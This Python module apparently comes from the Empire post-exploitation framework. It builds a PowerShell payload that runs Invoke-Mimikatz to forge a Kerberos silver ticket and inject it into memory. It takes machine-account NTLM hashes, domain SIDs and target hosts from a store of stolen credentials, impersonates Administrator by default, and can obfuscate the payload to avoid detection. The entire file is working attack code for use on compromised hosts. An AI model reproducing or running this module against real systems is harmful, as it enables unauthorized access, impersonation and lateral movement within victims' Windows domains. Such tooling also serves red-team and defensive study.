from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz Silver Ticket',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to generate a silver ticket for a server/service and inject it into memory."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com',
                "https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use for ticket creation.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'user' : {
                'Description'   :   'Username to impersonate.',
                'Required'      :   True,
                'Value'         :   'Administrator'
            },
            'domain' : {
                'Description'   :   'The fully qualified domain name.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'target' : {
                'Description'   :   'The fully qualified domain name of the target machine.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'sid' : {
                'Description'   :   'The SID of the specified domain.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'id' : {
                'Description'   :   'id to impersonate, defaults to 500.',
                'Required'      :   False,
                'Value'         :   ''
            },            
            'rc4' : {
                'Description'   :   'target machine rc4/NTLM hash',
                'Required'      :   False,
                'Value'         :   ''
            },
            'service' : {
                'Description'   :   'service to forge the ticket for (cifs, HOST, etc.)',
                'Required'      :   True,
                'Value'         :   'cifs'
            },
            'groups' : {
                'Description'   :   'Optional comma separated group IDs for the ticket.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
           
            if not userName.endswith("$"):
                print helpers.color("[!] please specify a machine account credential")
                return ""
            if domainName != "":
                self.options["domain"]['Value'] = domainName
                if host != "":
                    self.options["target"]['Value'] = str(host) + "." + str(domainName)
            if sid != "":
                self.options["sid"]['Value'] = sid
            if password != "":
                self.options["rc4"]['Value'] = password


        # error checking
        if not helpers.validate_ntlm(self.options["rc4"]['Value']):
            print helpers.color("[!] rc4/NTLM hash not specified")
            return ""

        if self.options["target"]['Value'] == "":
            print helpers.color("[!] target not specified")
            return ""

        if self.options["sid"]['Value'] == "":
            print helpers.color("[!] domain SID not specified")
            return ""

        # build the golden ticket command        
        scriptEnd = "Invoke-Mimikatz -Command '\"kerberos::golden"

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "credid":
                if values['Value'] and values['Value'] != '':
                    scriptEnd += " /" + str(option) + ":" + str(values['Value']) 

        scriptEnd += " /ptt\"'"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
